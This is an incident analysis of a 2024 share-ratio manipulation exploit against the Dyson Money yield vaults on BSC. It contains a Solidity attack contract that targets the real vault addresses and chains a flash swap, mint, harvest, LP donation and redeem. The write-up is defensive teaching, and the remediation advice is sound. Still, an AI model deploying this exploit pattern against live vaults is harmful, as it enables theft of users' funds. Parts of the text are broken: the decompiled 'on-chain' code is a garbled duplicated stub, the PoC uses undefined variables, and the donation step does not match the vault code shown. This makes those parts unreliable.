# Dyson Money — mint()+harvest()+redeem() Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | Dyson Money |
| **Chain** | BSC |
| **Loss** | ~52 BNB |
| **Vulnerable Contract b708** | [0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708](https://bscscan.com/address/0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708) |
| **Vulnerable Contract b821** | [0x5A8EEe279096052588DfCc4e8b466180490DB821](https://bscscan.com/address/0x5A8EEe279096052588DfCc4e8b466180490DB821) |
| **Vulnerable Contract b29b** | [0x2b9BDa587ee04fe51C5431709afbafB295F94bB4](https://bscscan.com/address/0x2b9BDa587ee04fe51C5431709afbafB295F94bB4) |
| **Root Cause** | Combination of DysonVault's `mint()`+`harvest()`+`redeem()` and StableV1AMM LP manipulation to skew the shares ratio, allowing withdrawal of more than the deposited amount |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Dyson_money_exp.sol) |

---

## 1. Vulnerability Overview

Dyson Money is a yield optimization protocol on BSC composed of three contracts (b708, b821, b29b). LP tokens deposited via `mint()` issue shares, `harvest()` collects rewards, and `redeem()` converts shares back to LP tokens. The attacker manipulated the StableV1AMM LP balance to skew the LP-per-share ratio, then called `redeem()` to withdraw far more LP than was deposited, stealing approximately 52 BNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: shares ratio calculated based on external LP balance
contract DysonVault {
    IERC20 public lpToken;
    uint256 public totalShares;

    function mint(uint256 lpAmount) external returns (uint256 shares) {
        uint256 totalLP = lpToken.balanceOf(address(this)); // references external balance
        if (totalShares == 0) {
            shares = lpAmount;
        } else {
            // shares = lpAmount * totalShares / totalLP
            // if totalLP is manipulated, shares are over/under-issued
            shares = lpAmount * totalShares / totalLP;
        }
        totalShares += shares;
        lpToken.transferFrom(msg.sender, address(this), lpAmount);
    }

    function redeem(uint256 shares) external returns (uint256 lpAmount) {
        uint256 totalLP = lpToken.balanceOf(address(this)); // references external balance
        // lpAmount = shares * totalLP / totalShares
        // totalLP manipulation → excess lpAmount paid out
        lpAmount = shares * totalLP / totalShares;
        totalShares -= shares;
        lpToken.transfer(msg.sender, lpAmount);
    }
}

// ✅ Safe code: uses internal accounting variable
contract DysonVault {
    uint256 public totalLPDeposited; // internal accounting

    function mint(uint256 lpAmount) external returns (uint256 shares) {
        shares = totalLPDeposited == 0 ? lpAmount : lpAmount * totalShares / totalLPDeposited;
        totalLPDeposited += lpAmount;
        totalShares += shares;
        lpToken.transferFrom(msg.sender, address(this), lpAmount);
    }

    function redeem(uint256 shares) external returns (uint256 lpAmount) {
        lpAmount = shares * totalLPDeposited / totalShares;
        totalLPDeposited -= lpAmount;
        totalShares -= shares;
        lpToken.transfer(msg.sender, lpAmount);
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: DysonMoney_decompiled.sol
contract DysonMoney {
contract DysonMoney {
    address public owner;

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Borrow LP tokens from StableV1AMM (flash swap)
  │
  ├─→ [2] DysonVault(b708).mint(small LP amount)
  │         └─ When totalLP is low → more shares issued
  │
  ├─→ [3] DysonVault(b821).harvest()
  │         └─ Collect rewards → modify internal state
  │
  ├─→ [4] Donate large LP amount directly to StableV1AMM
  │         └─ totalLP seen by DysonVault spikes sharply
  │
  ├─→ [5] DysonVault(b29b).redeem(shares)
  │         └─ lpAmount = shares * manipulated_totalLP / totalShares
  │         └─ Withdraw far more LP than deposited
  │
  ├─→ [6] Repay flash swap
  │
  └─→ [7] ~52 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IDysonVault {
    function mint(uint256 lpAmount) external returns (uint256 shares);
    function harvest() external;
    function redeem(uint256 shares) external returns (uint256 lpAmount);
    function totalShares() external view returns (uint256);
}

interface IStableV1AMM {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract AttackContract {
    IDysonVault constant vaultB708 = IDysonVault(0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708);
    IDysonVault constant vaultB821 = IDysonVault(0x5A8EEe279096052588DfCc4e8b466180490DB821);
    IDysonVault constant vaultB29b = IDysonVault(0x2b9BDa587ee04fe51C5431709afbafB295F94bB4);

    function testExploit() external {
        // [1] LP flash swap
        stableAMM.swap(flashLP, 0, address(this), abi.encode("flash"));
    }

    function hook(address, uint256 amount, uint256, bytes calldata) external {
        // [2] Mint into vault with small LP amount — acquire initial shares
        lpToken.approve(address(vaultB708), smallAmount);
        uint256 shares = vaultB708.mint(smallAmount);

        // [3] Collect rewards via harvest
        vaultB821.harvest();

        // [4] Donate large LP amount directly to StableV1AMM
        lpToken.transfer(address(stableAMM), amount - smallAmount);
        stableAMM.sync();  // totalLP referenced by vault spikes sharply

        // [5] Redeem shares — withdraw large LP at manipulated ratio
        uint256 lpOut = vaultB29b.redeem(shares);
        // lpOut >> smallAmount (effect of shares ratio manipulation)

        // [6] Repay flash swap
        lpToken.transfer(address(stableAMM), amount);
        // Remainder = ~52 BNB profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Shares ratio manipulation (external LP balance-based calculation) |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (LP donate + mint/harvest/redeem combination) |
| **DApp Category** | Yield Optimization Vault |
| **Impact** | Shares ratio skew → excess LP withdrawal → ~52 BNB stolen |

## 6. Remediation Recommendations

1. **Use internal balance variable**: Reference an internal `totalLPDeposited` variable instead of `lpToken.balanceOf(address(this))`
2. **Prevent donate attacks**: Design so that directly transferring LP externally has no effect on the shares ratio
3. **Function atomicity**: Restrict the pattern where `mint`, `harvest`, and `redeem` are called consecutively within the same transaction
4. **Minimum liquidity lock**: Lock a minimum amount of LP to a dead address when issuing the initial shares

## 7. Lessons Learned

- As with Sonne Finance (2024-05), directly using external balances (`balanceOf`) for shares ratio calculation makes the protocol vulnerable to donate attacks.
- The `mint()→harvest()→donate→redeem()` combination is a recurring attack pattern in vault protocols.
- Yield optimization vaults must maintain internal accounting variables to be independent of external token balance changes.